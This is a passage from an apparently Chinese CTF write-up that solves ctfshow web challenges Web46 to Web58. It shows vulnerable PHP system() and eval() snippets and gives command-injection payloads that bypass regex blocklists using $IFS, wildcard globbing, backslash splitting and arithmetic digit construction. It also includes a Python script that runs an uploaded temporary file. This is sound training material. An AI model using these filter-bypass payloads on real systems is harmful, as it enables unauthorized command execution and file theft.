operator">||</span></code></pre><h1 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:50:19# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>过滤加了一个<code>*</code>和数字</p><p>Payload:</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09fla?.php<span class="token operator">||</span></code></pre><h1 id="We47"><a href="#We47" class="headerlink" title="We47"></a>We47</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:59:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>多过滤了几个读取文件的命令，但是没<code>tac</code>啥事，继续使用之前的payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09fla?.php<span class="token operator">||</span></code></pre><h1 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h1><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php/*<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:06:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET['c']))&amp;#123;    $c=$_GET['c'];    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c))&amp;#123;        system($c." >/dev/null 2>&amp;1");    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>加了几个函数，依旧没啥影响，继续</p><p>payload:</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09fla?.php<span class="token operator">||</span></code></pre><h1 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:22:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>依旧没啥影响，payload继续</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09fla?.php<span class="token operator">||</span></code></pre><h1 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>这次把<code>%</code>进行了过滤，我们使用&lt;&gt;号进行绕过，这里通配符进行修改一下，&lt;&gt;和？一起没有显示出来，改用<code>\</code>进行绕过，paylaod如下</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;</span><span class="token operator">></span>fla\g.php<span class="token operator">||</span></code></pre><h1 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>过滤了tac，用<code>\</code>绕一下</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>ta\c<span class="token operator">&lt;</span><span class="token operator">></span>fla\g.php<span class="token operator">||</span></code></pre><h1 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>过滤了尖括号，但是放空了<code>$</code>给我们，所以payload为</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>ta\c$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;fla\g.php||</span></code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109292344111.png" alt="image-20210928170601498"></p><p>突然发现flag换地方了。。。。尴尬</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>ls$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;/||</span></code></pre><p>发现在根目录下</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109292344043.png" alt="image-20210928170746440"></p><p>所以真正的payload为</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>ta\c$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;/fla?||</span></code></pre><h1 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        echo($c);        $d = system($c);        echo </span><span class="token string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;        echo </span><span class="token string">'no'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>没有吞回显的问题了，直接爆</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>ta\c$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;fla?.php</span></code></pre><h1 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c);    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>这次过滤了好多字母，也不能会用<code>\</code>的形式进行分割，但还有另一个读取的命令grep可以使用</p><pre class=" language-bash"><code class="language-bash"><span class="token function">grep</span> flag flag.php 查找flag.php文件中含有flag的那一行，并且打印出来</code></pre><p>所以我们可以构造payload如下，在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})</p><pre><code>?c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</code></pre><h1 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">// 你们在炫技吗？if(isset($_GET['c']))&amp;#123;    $c=$_GET['c'];    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i", $c))&amp;#123;        system($c);    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>这次把字母都给禁掉了，一般遇到这情况最容易想到的应该是进行异或运算等等办法进行构造，在这里他没有禁掉数字，我们有其他略微方便点的方法，就是通过匹配bin下存在的命令进行读取flag</p><blockquote><p>bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</p></blockquote><p>这里没有禁用数字所以我们可以使用base64命令，构造如下</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>/???/????64 ????.???也就是?c<span class="token operator">=</span>/bin/base64 flag.php</code></pre><h1 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">// 你们在炫技吗？if(isset($_GET['c']))&amp;#123;    $c=$_GET['c'];    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\&amp;#123;|\'|\"|\`|\%|\x09|\x26|\>|\&lt;/i", $c))&amp;#123;        system($c);    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>这次在上一题的基础上多过滤掉了数字，导致我们无法使用上题的payload。</p><p>这里我们可以利用php的特性：如果我们发送一个上传文件的post包，php会将我们上传的文件保存在临时的文件夹下，并且默认的文件目录是/tmp/phpxxxxxx。文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母</p><p>在ascii码表中观察发现</p><p>在大写字母A的前一个符号为<code>@</code>，大写字母Z的后一个字母为<code>[</code>，因此我们可以使用<code>[@-[]</code>来表示匹配大写字母，也就是变成了这样的形式：<code>???/????????[@-[]</code>到这一步已经能匹配到了我们上传的文件，那限制了字母后该如何执行上传的文件呢？这里有个技巧，就是使用<code>. file</code>来执行文件</p><p>所以我们的完整payload就是</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>. /???/????????<span class="token punctuation">[</span>@-<span class="token punctuation">[</span><span class="token punctuation">]</span>并且同时上传我们的文件，文件内容里面是命令</code></pre><p>写个脚本来完成</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-- coding:UTF-8 --# Author:dota_st# Date:2021/2/11 9:14# blog: www.wlhhlc.topimport requestswhile True:    url = "http://92a3d8ba-280b-4cb8-bd47-58b577bb6204.chall.ctf.show:8080/?c=. /???/????????[@-[]"    r = requests.post(url, files=&amp;#123;"file": ("dota.txt", "cat flag.php")&amp;#125;)    flag = r.text.split('ctfshow')    if len(flag) >1:        print(r.text)        break</span></code></pre><h1 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">// 还能炫的动吗？//flag in 36.phpif(isset($_GET['c']))&amp;#123;    $c=$_GET['c'];    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i", $c))&amp;#123;        system("cat ".$c.".php");    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>这题不仅过滤了字母数字，还把通配符都给过滤了。查了一下资料，发现在shell中可以利用<code>$</code>和<code>()</code>进行构造数字，而这道题提示flag在36.php中，system中已经写好cat和php，所以我们只需要构造出36即可</p><blockquote><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> 再对-2做一次取反得到1，所以值为1</p><p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1</p></blockquote><p>所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36</p><pre class=" language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">"$((~$(("</span><span class="token operator">+</span><span class="token string">"$((~$(())))"</span><span class="token operator">*</span><span class="token number">37</span><span class="token operator">+</span><span class="token string">"))))"</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">))</span></code></pre><h1 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">// 你们在炫技吗？if(isset($_POST['c']))&amp;#123;        $c= $_POST['c'];        eval($c);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>一句话木马，喜大普奔，直接上蚁剑</p><p>不过应该是考读取文件的，我们使用读取文件函数进行读取flag，payload如下</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>show_source<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>读取文件函数用法</p><pre class=" language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">php_strip_whitespace</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// var_dumpfread(fopen($filename,"r"), $size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen("cat flag", "r"), $size));print_r(fgets(fopen($filename, "r"))); // 读取一行fpassthru(fopen($filename, "r")); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,"r"), $size));print_r(fgetss(fopen($filename, "r"))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen("flag", 